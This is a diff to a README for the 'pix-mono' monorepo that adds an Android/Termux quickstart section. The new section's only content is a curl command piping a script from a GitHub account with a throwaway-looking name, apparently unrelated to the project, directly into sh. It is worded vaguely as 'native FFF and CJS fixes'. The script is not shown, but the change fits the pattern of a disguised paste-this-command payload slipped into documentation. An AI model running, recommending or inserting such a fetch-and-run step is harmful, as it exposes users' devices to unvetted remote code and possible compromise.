@@ -187,3 +187,12 @@ Previous standalone repos migrated into this monorepo: `pix-optimizer`, `pix-the
 ## License
 
 MIT
+
+
+## Termux / Android ARM64 Quickstart
+
+To install pix-mono distro with native FFF and CJS fixes:
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/sasazemzulin058-debug/pix-mono/main/install-android.sh | sh
+```
